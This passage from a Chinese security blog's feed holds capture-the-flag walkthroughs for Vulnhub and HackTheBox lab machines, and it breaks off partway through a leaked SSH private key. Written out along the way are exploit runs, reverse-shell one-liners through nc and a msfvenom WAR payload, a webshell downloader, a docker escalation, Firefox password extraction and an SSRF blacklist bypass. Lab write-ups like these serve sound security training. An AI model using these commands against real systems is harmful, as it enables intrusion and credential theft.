[--&gt; http://127.0.0.1/mrtg/] http://192.168.1.102/usage (Status: 301) [Size: 293] [--&gt; http://127.0.0.1/usage/] http://192.168.1.102/test.php (Status: 200) [Size: 27] 挨个去看看 几个页面都会跳转到127.0.0.1，只有test.php可以访问，而且还没什么东西 继续回到端口看看吧 ┌──(root💀kali)-[~/Desktop] └─# smbclient -L 192.168.1.102 1 ⨯ protocol negotiation failed: NT_STATUS_IO_TIMEOUT 漏洞利用看到80端口后面的mod_ssl&#x2F;2.8.4，去搜一下有没有Exploit ┌──(root💀kali)-[~/Desktop] └─# searchsploit mod_ssl ------------------------------------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------ --------------------------------- Apache mod_ssl 2.0.x - Remote Denial of Service | linux/dos/24590.txt Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow | multiple/dos/21575.txt Apache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuck.c&#39; Remote Buffer Overflow | unix/remote/21671.c Apache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuckV2.c&#39; Remote Buffer Overflow (1) | unix/remote/764.c Apache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuckV2.c&#39; Remote Buffer Overflow (2) | unix/remote/47080.c Apache mod_ssl OpenSSL &lt; 0.9.6d / &lt; 0.9.7-beta2 - &#39;openssl-too-open.c&#39; SSL2 KEY_ARG Overflow | unix/remote/40347.txt ------------------------------------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results 对比mod_ssl&#x2F;2.8.4版本，有三个版本合适，挨个进行测试 经过测试发现unix&#x2F;remote&#x2F;47080.c是可以使用的，咱们给他复制出来 ┌──(root💀kali)-[~/Desktop] └─# locate unix/remote/47080.c /usr/share/exploitdb/exploits/unix/remote/47080.c ┌──(root💀kali)-[~/Desktop] └─# cp /usr/share/exploitdb/exploits/unix/remote/47080.c ./ 然后使用gcc进行编译 ┌──(root💀kali)-[~/Desktop] └─# gcc -o exploit 47080.c -lcrypto 47080.c:21:10: fatal error: openssl/ssl.h: 没有那个文件或目录 21 | #include &lt;openssl/ssl.h&gt; | ^~~~~~~~~~~~~~~ compilation terminated. 提示报错了，经过百度搜索，发现是缺少了组件 咱们使用apt进行安装 ┌──(root💀kali)-[~/Desktop] └─# apt-get install libssl1.0-dev 然后再进行编译 ┌──(root💀kali)-[~/Desktop] └─# gcc -o exploit 47080.c -lcrypto ┌──(root💀kali)-[~/Desktop] └─# ls 47080.c exploit 去运行一下 ┌──(root💀kali)-[~/Desktop] └─# ./exploit ******************************************************************* * OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open * ******************************************************************* * by SPABAM with code of Spabam - LSD-pl - SolarEclipse - CORE * * #hackarena irc.brasnet.org * * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname * * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam * * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ * ******************************************************************* : Usage: ./exploit target box [port] [-c N] target - supported box eg: 0x00 box - hostname or IP address port - port for ssl connection -c open N connections. (use range 40-50 if u dont know) 运行后得到了运行参数，咱们还得先找到对应的版本 ┌──(root💀kali)-[~/Desktop] └─# ./exploit | grep apache-1.3.20 1 ⨯ 0x02 - Cobalt Sun 6.0 (apache-1.3.20) 0x27 - FreeBSD (apache-1.3.20) 0x28 - FreeBSD (apache-1.3.20) 0x29 - FreeBSD (apache-1.3.20+2.8.4) 0x2a - FreeBSD (apache-1.3.20_1) 0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk) 0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk) 0x3f - Mandrake Linux 8.1 (apache-1.3.20-3) 0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1 0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2 0x7e - Slackware Linux 8.0 (apache-1.3.20) 0x86 - SuSE Linux 7.3 (apache-1.3.20) 符合条件的有两个，分别是0x6a和0x6b，分别去测试一下 ┌──(root💀kali)-[~/Desktop] └─# ./exploit 0x6a 192.168.1.102 -c 40 ******************************************************************* * OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open * ******************************************************************* * by SPABAM with code of Spabam - LSD-pl - SolarEclipse - CORE * * #hackarena irc.brasnet.org * * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname * * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam * * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ * ******************************************************************* Connection... 40 of 40 Establishing SSL connection cipher: 0x4043808c ciphers: 0x80f8070 Ready to send shellcode Spawning shell... Good Bye! 0x6a测试失败，现在去测试一下0x6b ┌──(root💀kali)-[~/Desktop] └─# ./exploit 0x6b 192.168.1.102 -c 40 ******************************************************************* * OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open * ******************************************************************* * by SPABAM with code of Spabam - LSD-pl - SolarEclipse - CORE * * #hackarena irc.brasnet.org * * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname * * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam * * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ * ******************************************************************* Connection... 40 of 40 Establishing SSL connection cipher: 0x4043808c ciphers: 0x80f81e8 Ready to send shellcode Spawning shell... bash: no job control in this shell bash-2.05$ d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo --09:32:52-- https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c =&gt; `ptrace-kmod.c&#39; Connecting to dl.packetstormsecurity.net:443... connected! Unable to establish SSL connection. Unable to establish SSL connection. gcc: ptrace-kmod.c: No such file or directory gcc: No input files rm: cannot remove `ptrace-kmod.c&#39;: No such file or directory bash: ./exploit: No such file or directory bash-2.05$ bash-2.05$ whoami&amp;&amp;id whoami&amp;&amp;id apache uid=48(apache) gid=48(apache) groups=48(apache) 0x6b成功getshell，现在去提权 权限提升经过测试后没有发现提权的点，但是发现了另一种root权限的方法，那就是用msf的模块 use exploit/linux/samba/trans2open set payload linux/x86/shell_reverse_tcp show options set rhosts 192.168.1.102 exploit msf6 exploit(linux/samba/trans2open) &gt; exploit [*] Started reverse TCP handler on 192.168.1.106:4444 [*] 192.168.1.102:139 - Trying return address 0xbffffdfc... [*] 192.168.1.102:139 - Trying return address 0xbffffcfc... [*] 192.168.1.102:139 - Trying return address 0xbffffbfc... [*] 192.168.1.102:139 - Trying return address 0xbffffafc... [*] 192.168.1.102:139 - Trying return address 0xbffff9fc... [*] 192.168.1.102:139 - Trying return address 0xbffff8fc... [*] Command shell session 1 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1036) at 2021-11-13 07:04:24 -0500 [*] Command shell session 2 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1037) at 2021-11-13 07:04:25 -0500 [*] Command shell session 3 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1038) at 2021-11-13 07:04:26 -0500 whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=99(nobody) 用msf的模块打就是root，至于为啥我也没研究出个所以然来（主要因为菜） 知道原因的小伙伴可以告诉我一下","categories":[],"tags":[{"name":"Vulnhub","slug":"Vulnhub","permalink":"http://www.lucifiel.com/tags/Vulnhub/"}]},{"title":"Chill_Hack - Vulnhub","slug":"Vulnhub/Vulnhub -Chill_Hack","date":"2021-10-17T08:31:38.000Z","updated":"2023-06-13T03:56:21.000Z","comments":true,"path":"2021/10/17/Vulnhub/Vulnhub -Chill_Hack/","link":"","permalink":"http://www.lucifiel.com/2021/10/17/Vulnhub/Vulnhub%20-Chill_Hack/","excerpt":"","text":"Vulnhub-Chill_Hack靶场实战 Vulnhub-Chill_Hack 靶场下载地址https://www.vulnhub.com/entry/chill-hack-1,622/ 废话不多说 直接开始 第一步使用kali扫描内网IP Arp-scan –l 获得靶场IP为192.168.72.132 对靶场进行端口扫描 Nmap –A –v 192.168.72.132 发现存在21 22 80三个端口 21端口存在匿名访问 咱们先访问看看 用户名使用anonymous 密码为空 成功登陆 查看有什么文件 发现存在一个txt文件 我们查看一下 使用get下载到本地然后打开查看 嗯…好像也没什么用 我们还是先看看80端口的Web服务吧 看上去像是一个体育比赛的官网？ 扫描一下目录 发现了一个有趣的URL http://192.168.72.132/secret/index.php 可以执行命令 OK 突破口应该就在这里了 当我输入ls想查看一下当前目录文件的时候 这时我想起来我们那个note.txt文件里的话是什么意思 证明这里有过滤 就是不知道是白名单还是黑名单了 经过我大量测试 该靶场为黑名单验证 那就好办了 绕过吧 出去吃了个饭 回来突然来了思路 将两个指令结合起来 不就成了吗 例如 ls会被拦截 那就 whoami;ls 成功执行 我可真是个小机灵 将该方法和NC反弹一结合 不就拿到shell了？ 经过大量测试 发现可用的反弹语句为 dir;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f | &#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.72.130 7777 &gt; &#x2F;tmp&#x2F;f 本机监听 nc –lvp 7777 执行 成功拿到一个shell 该shell权限还是较低 并且操作非常不便利 咱们要想办法提权 查找python版本 Which python 成功确认python版本为python3 使用python3将shell进行提升 python3 -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’ 成功 该命令不会对电脑有什么危害 但偶尔会有奇效 在这个文件夹下 这个hacker.php引起了我的注意 查看一下吧 在黑暗中我会看到答案？真就人均谜语人呗 在hacker.php中 我们看到images文件夹中有一张图片 应该就是线索所在 咱们进入images文件夹 OK 咱们把这张图片用nc下载下来 也可以用python3开启http服务进行下载 不过我图省事儿 就nc了吧 本地电脑运行 nc –nvlp 4444 &gt; hacker-with-laptop_23-2147985341.jpg 咱们保持原名不动 Shell里运行 nc 192.168.72.130 4444 -w 4 &lt; hacker-with-laptop_23-2147985341.jpg OK 稍等一会儿 成功下载下来 根据hacker.php中的提示 在黑暗中我们会看到答案 这不就是妥妥的图片隐写吗 不愧是我 最近的柯南没白看 使用steghide查看 果然存在一个名为backup.zip的压缩包 不愧是我 依然使用steghide进行解压 OK 得到了这个名为backup.zip的压缩包文件 我们现在将他解压缩 我丢啊 这里来个密码 成吧 再找 找？找是不可能找的 就咱这暴脾气 爆他！ 使用zip2johb生成了一个backup.john文件 咱们使用john爆他 OK 完成 咱们使用john查看密码 密码为pass1word 行吧 经典弱口令 接下来咱们解压文件 成功解压出来 查看解压出来的文件 好家伙 还有个base64编码 解密吧 返回我们的shell 查看一下用户 使用我们得到的密码登入进用户anurodh 成功登入 确认账户密码没问题了 这时候咱们就要用到一开始扫描出的22端口了 毕竟shell是不稳定的 使用ssh服务登入吧 成功登入 有一个稳定的权限的感觉太爽了 这时候肯定就是提权了是吧 直接使用经典的sudo su 失败了 嗯… 情理之中 意料之外 使用sudo –l查看sudo的权限 发现apaar可以提权？那就造他 查看apaar文件夹下的文件 发现apaar下有个txt文件 但由于权限文件我们无法访问 但上述提到了 apaar下有个sh脚本我们可以执行 那就执行它 它需要一个名字 咱们随便输入即可 执行完毕了 但我不知道它有效果 那就阅读一下吧 这个批处理 有点意思啊 似乎可以命令执行 尝试成功 有点意思 既然我们没有权限读取local.txt文件 那就让apaar来读取吧 啊这 我还以为是什么提权的东西呢 结果你告诉我 这就是个flag？ 那也行吧 flag1 get {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww} OK 咱们继续找其他方法提权吧 输入id查看权限 嗯？docker？要素察觉 我们使用一些提权辅助工具https://gtfobins.github.io/ 在里面搜搜docker 使用此命令即可提权docker run -v &#x2F;:&#x2F;mnt –rm -it alpine chroot &#x2F;mnt sh 提权成功 进入root目录 拿到最后一个flag Flag2 get {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg} 总结语：怎么说呢，这个靶场还是挺有意思的。我起初以为就是简单的一个命令执行getshell以后一个脚本提权就拿下了。没想到还有这么多步骤，挺严谨的吧","categories":[],"tags":[{"name":"Vulnhub","slug":"Vulnhub","permalink":"http://www.lucifiel.com/tags/Vulnhub/"}]},{"title":"BlueSky - Vulnhub","slug":"Vulnhub/Vulnhub -BlueSky","date":"2021-10-07T08:31:38.000Z","updated":"2023-06-13T03:56:07.000Z","comments":true,"path":"2021/10/07/Vulnhub/Vulnhub -BlueSky/","link":"","permalink":"http://www.lucifiel.com/2021/10/07/Vulnhub/Vulnhub%20-BlueSky/","excerpt":"","text":"靶场实战 Vulnhub-BlueSky首先使用kali扫描靶场的IP地址 Arp-scan –l 对比MAC地址 成功得到靶场IP地址192.168.72.131 进行端口扫描 Nmap –Sv –v 192.168.72.131 开放了端口22和8080 22为SSH端口，突破多半都是弱口令，咱们先不考虑这种情况，访问8080的WEB服务器看看 http://192.168.72.131:8080 访问后发现是tomcat 9.0.40 第一时间想到了tomcat的cve漏洞 使用searchsploit搜索 tomcat 9.0.40的漏洞 嗯…好像没有 那就测试一波0day吧(弱口令) Tomcat&#x2F;tomcat Admin&#x2F;admin OK 确认没有0day 那就只能找该版本存在的漏洞了 在百度找到一个struts2-showcase的漏洞（s2-048远程代码执行） 好家伙 直接上工具了哈 就懒得再测试了 url: http://192.168.72.131:8080/struts2-showcase/index.action 好家伙 这个URL我爆目录还没爆出来 在网上搜索相关漏洞才找到 下载exp git clone https://github.com/jrrdev/cve-2017-5638.git 测试是否存在漏洞 python exploit.py “http://192.168.72.131:8080/struts2-showcase/index.action&quot; “whoami” whoami执行成功 查看是否存在nc权限 python exploit.py “http://192.168.72.131:8080/struts2-showcase/index.action&quot; “nc” 存在nc权限的 但似乎没有nc –e的权限 得通过其他方式反弹shell了 首先使用mknod建立管道 Python exploit.py “http://192.168.72.131:8080/struts2-showcase/index.action&quot; “mknod &#x2F;tmp&#x2F;backpipe p” Kali监听4444端口 Nc –nvlp 4444 反弹shell，将内容传递物使用管道文件p作为桥梁，进行数据重定向传递 python exploit.py “http://192.168.72.131:8080/struts2-showcase/index.action&quot; -c “&#x2F;bin&#x2F;sh 0&lt;&#x2F;tmp&#x2F;p | nc 192.168.72.133 4444 1&gt;&#x2F;tmp&#x2F;p” 正常来说现在kali是会获取到一个nc的shell的，但我这边不知道什么原因无法成功，先教大家此方法继续操作的方法，我再演示我自己做的替代的方法 获取到shell后在shell内运行 python3 -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’ 因为靶机环境内没有python2的环境，所以我们使用python3提升为一个交互式shell就可以了 第二种方法： 第二种方法我们使用window来进行渗透 首先使用struts2的图形化验证工具进行漏洞验证 得到目录地址 webpath:&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;struts2-showcase&#x2F; 直接上传大马会超出字节限制 上传冰蝎的马冰蝎会无法识别webshell的密码 直接上传蚁剑的马也会超出字节限制 那么怎么办呢？ 很好解决，首先我们上传一个下载文件的一句话木马 得到webshell地址 http://192.168.72.131:8080/struts2-showcase/111.jsp 然后在本地搭建一个web服务器，把要使用的一句话木马或大马放在里面，使用该一句话木马进行访问下载 http://192.168.72.131:8080/struts2-showcase/111.jsp?f=/usr/local/tomcat/webapps/struts2-showcase/222.jsp&u=http://192.168.0.159/333.jsp 上面的222.jsp是要保存的webshell马名字 333.jsp是我们在本地web服务器内储存的名字 111.jsp是当前的下载马 成功下载蚁剑的一句话木马 可以成功访问文件，但我们发现该一句话木马似乎无法执行命令，那怎么办呢？ 小问题，我们利用tomcat本身的漏洞进行提权就好了 首先找到tomcat的账号木马 地址：&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;conf&#x2F;tomcat-users.xml 第45行 成功得到 账号：admin 密码：6mzf3&gt;gfZ.pN8_Mp 注意：此方法较为麻烦，主要用于无法使用nc弹回shell的情况下使用，我这边使用了各个方法都无法弹回，不得已之下才使用这个方法 现在我们回到网页去登录账号密码 登陆后的状态 我们发现下面可以部署文件，OK 那就好办了 使用WAR木马上传反弹shell就搞定了 使用msfvenom生成war马 msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.72.133 LPORT&#x3D;5555 -f war -o shell.war OK 我们去上传 成功上传后，我们可以看到&#x2F;shell 这就是我们上传的war马 在kali中监听5555端口 Nc –nvlp 5555 然后去访问我们上传的war马 curl http://192.168.72.131:8080/shell/ OK 我们成功获取到一个shell 同样的我们使用python3获取一个交互式shell python3 -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’ 查看user.txt文件 成功获取user账户的flag 我们查看所有文件 Ls –a 在用户根目录下发现mozilla firefox浏览器文件 对我来说，最想要得到的就是它的用户名密码记录 不同版本的Firefox保存密码记录的文件名称不同，在网上找到firefox浏览器存储用户名密码的文件是logins.json（版本号大于等于32.0）或者signons.sqlite（版本号大于等于3.5，小于32.0）， 具体信息参考：http://kb.mozillazine.org/Profile_folder_-_Firefox 进入位置 .mozilla&#x2F;firefox&#x2F;fvbljmev.default-release 可以看到两个文件 key4.db logins.json 我们要把这两个文件搞出来 使用python3开启web服务器 python3 -m http.server 6666 使用wget成功拷贝两个文件 wget http://192.168.72.131:6666/logins.json wget http://192.168.72.131:6666/key4.db 下载解密脚本 https://github.com/lclevy/firepwd git clone https://github.com/lclevy/firepwd.git cd firepwd pip3 install -r requirements.txt 运行python3 firepwd.py https://twitter.com:b'minhtuan',b'skysayohyeah‘ 得到账号：minhtuan 得到密码：skysayohyeah 我们使用sudo –l查看sudo权限 权限挺高 直接sudo su即可成功提权 成功拿到root权限的flag 本次靶场完成","categories":[],"tags":[{"name":"Vulnhub","slug":"Vulnhub","permalink":"http://www.lucifiel.com/tags/Vulnhub/"}]},{"title":"Forge - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Forge","date":"2021-09-28T11:38:36.000Z","updated":"2023-06-13T03:44:09.000Z","comments":true,"path":"2021/09/28/Hackthebox/Medium/Hackthebox-Forge/","link":"","permalink":"http://www.lucifiel.com/2021/09/28/Hackthebox/Medium/Hackthebox-Forge/","excerpt":"","text":"Hackthebox - Forge靶场信息 靶场类型 信息搜集首先使用nmap扫描一下端口 ┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.111 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-26 21:51 EDT Warning: 10.10.11.111 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.11.111 Host is up (0.35s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA) | 256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA) |_ 256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-title: Did not follow redirect to http://forge.htb No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=9/26%OT=22%CT=1%CU=32048%PV=Y%DS=2%DC=T%G=Y%TM=615123F OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 358.39 ms 10.10.14.1 2 358.42 ms 10.10.11.111 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 71.65 seconds 这边只开了22和80端口，咱们去看看80端口的http服务内容 访问后直接被跳转到了forge.htb域名，这里咱们加一个域名解析 echo 10.10.11.111 forge.htb &gt;&gt; /etc/hosts 然后再访问一次 这里有个上传功能，去试一下是否可以上传 上传后会被去掉后缀？还是怎么着不太明白，反正没有解析，找一下其他思路吧 主页上没有什么可看的东西了，爆一下目录和子域名吧 ┌──(root💀kali)-[~/Desktop] └─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -t 200 -u http://forge.htb/ =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://forge.htb/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/09/26 22:14:58 Starting gobuster in directory enumeration mode =============================================================== http://forge.htb/uploads (Status: 301) [Size: 224] [--&gt; http://forge.htb/uploads/] http://forge.htb/static (Status: 301) [Size: 307] [--&gt; http://forge.htb/static/] http://forge.htb/upload (Status: 200) [Size: 929] http://forge.htb/server-status (Status: 403) [Size: 274] =============================================================== 2021/09/26 22:29:14 Finished =============================================================== 这里目录没爆出什么有用的东西，再去扫描DNS看看 ┌──(root💀kali)-[~/Desktop] └─# gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r -t 50 -u forge.htb =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://forge.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2021/09/26 22:48:35 Starting gobuster in VHOST enumeration mode =============================================================== Found: admin.forge.htb (Status: 200) [Size: 27] =============================================================== 2021/09/26 22:50:16 Finished =============================================================== 找到了一个admin子域名，添加到hosts后再去试试 echo 10.10.11.111 admin.forge.htb &gt;&gt; /etc/hosts 访问后提示只允许本地主机，得想办法绕过一下 漏洞利用整理一下目前的信息 forge.htb为一个上传点 admin.forge.htb只允许本地访问 咱们咱们抓一下上传点的包看看内容 看到后面才发现这个页面还有一个Upload from url的功能，疏忽了。 抓个包看看 这边随便输入点东西以后，显示支持http和https协议，再结合我们之前的admin.forge.htb来看，这不就是一个妥妥的SSRF？ 这样利用后，显示该URL被列入了黑名单，需要想办法绕过一下 尝试性使用大小写绕过方式轻轻松松绕过，返回了一个URL，打开看看 ┌──(root💀kali)-[~/Desktop] └─# curl http://forge.htb/uploads/2Y6eGsD37WCBc1m3pSJO &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Admin Portal&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/main.css&quot;&gt; &lt;header&gt; &lt;nav&gt; &lt;h1 class=&quot;&quot;&gt;&lt;a href=&quot;/&quot;&gt;Portal home&lt;/a&gt;&lt;/h1&gt; &lt;h1 class=&quot;align-right margin-right&quot;&gt;&lt;a href=&quot;/announcements&quot;&gt;Announcements&lt;/a&gt;&lt;/h1&gt; &lt;h1 class=&quot;align-right&quot;&gt;&lt;a href=&quot;/upload&quot;&gt;Upload image&lt;/a&gt;&lt;/h1&gt; &lt;/nav&gt; &lt;/header&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;center&gt;&lt;h1&gt;Welcome Admins!&lt;/h1&gt;&lt;/center&gt; &lt;/body&gt; &lt;/html&gt; 成功读取到内容，给了一个/announcements目录 让我们拿去再去读取一下，返回了域名，接着访问 http://forge.htb/uploads/CnrWy5jKhQ1mykfx1ONY ┌──(root💀kali)-[~/Desktop] └─# curl http://forge.htb/uploads/CnrWy5jKhQ1mykfx1ONY &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Announcements&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/main.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/announcements.css&quot;&gt; &lt;header&gt; &lt;nav&gt; &lt;h1 class=&quot;&quot;&gt;&lt;a href=&quot;/&quot;&gt;Portal home&lt;/a&gt;&lt;/h1&gt; &lt;h1 class=&quot;align-right margin-right&quot;&gt;&lt;a href=&quot;/announcements&quot;&gt;Announcements&lt;/a&gt;&lt;/h1&gt; &lt;h1 class=&quot;align-right&quot;&gt;&lt;a href=&quot;/upload&quot;&gt;Upload image&lt;/a&gt;&lt;/h1&gt; &lt;/nav&gt; &lt;/header&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;ul&gt; &lt;li&gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!&lt;/li&gt; &lt;li&gt;The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.&lt;/li&gt; &lt;li&gt;The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.&lt;/li&gt; &lt;/ul&gt; &lt;/body&gt; &lt;/html&gt; 我们得到了一个FTP账号密码 username = user password = heightofsecurity123! 这边提示ftp不能被外部登录，但upload接口可以使用?u=参数指定ftp url url=http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@127.1.1.1&amp;remote=1 继续调用 http://forge.htb/uploads/BRrgg0w44uZvHW3WEnWz 继续访问，这个步骤重复性好高啊 ┌──(root💀kali)-[~/Desktop] └─# curl http://forge.htb/uploads/BRrgg0w44uZvHW3WEnWz 1 ⚙ drwxr-xr-x 3 1000 1000 4096 Aug 04 19:23 snap -rw-r----- 1 0 1000 33 Sep 24 18:02 user.txt 这样获取好麻烦，又不想（hui）写脚本，试试看有没有私钥吧 url=http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@127.1.1.1/.ssh/id_rsa&amp;remote=1 http://forge.htb/uploads/cBNUTYA6eT50o5vEjpY1 ┌──(root💀kali)-[~/Desktop] └─# curl http://forge.htb/uploads/cBNUTYA6eT50o5vEjpY1 -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAnZIO+Qywfgnftqo5as+orHW/w1WbrG6i6B7Tv2PdQ09NixOmtHR3 rnxHouv4/l1pO2njPf5GbjVHAsMwJDXmDNjaqZfO9OYC7K7hr7FV6xlUWThwcKo0hIOVuE 7Jh1d+jfpDYYXqON5r6DzODI5WMwLKl9n5rbtFko3xaLewkHYTE2YY3uvVppxsnCvJ/6uk r6p7bzcRygYrTyEAWg5gORfsqhC3HaoOxXiXgGzTWyXtf2o4zmNhstfdgWWBpEfbgFgZ3D WJ+u2z/VObp0IIKEfsgX+cWXQUt8RJAnKgTUjGAmfNRL9nJxomYHlySQz2xL4UYXXzXr8G mL6X0+nKrRglaNFdC0ykLTGsiGs1+bc6jJiD1ESiebAS/ZLATTsaH46IE/vv9XOJ05qEXR GUz+aplzDG4wWviSNuerDy9PTGxB6kR5pGbCaEWoRPLVIb9EqnWh279mXu0b4zYhEg+nyD K6ui/nrmRYUOadgCKXR7zlEm3mgj4hu4cFasH/KlAAAFgK9tvD2vbbw9AAAAB3NzaC1yc2 EAAAGBAJ2SDvkMsH4J37aqOWrPqKx1v8NVm6xuouge079j3UNPTYsTprR0d658R6Lr+P5d aTtp4z3+Rm41RwLDMCQ15gzY2qmXzvTmAuyu4a+xVesZVFk4cHCqNISDlbhOyYdXfo36Q2 GF6jjea+g8zgyOVjMCypfZ+a27RZKN8Wi3sJB2ExNmGN7r1aacbJwryf+rpK+qe283EcoG K08hAFoOYDkX7KoQtx2qDsV4l4Bs01sl7X9qOM5jYbLX3YFlgaRH24BYGdw1ifrts/1Tm6 dCCChH7IF/nFl0FLfESQJyoE1IxgJnzUS/ZycaJmB5ckkM9sS+FGF1816/Bpi+l9Ppyq0Y JWjRXQtMpC0xrIhrNfm3OoyYg9REonmwEv2SwE07Gh+OiBP77/VzidOahF0RlM/mqZcwxu MFr4kjbnqw8vT0xsQepEeaRmwmhFqETy1SG/RKp1odu/Zl7tG+M2IRIPp8gyurov565kWF DmnYAil0e85RJt5oI+IbuHBWrB/ypQAAAAMBAAEAAAGALBhHoGJwsZTJyjBwyPc72KdK9r rqSaLca+DUmOa1cLSsmpLxP+an52hYE7u9flFdtYa4VQznYMgAC0HcIwYCTu4Qow0cmWQU 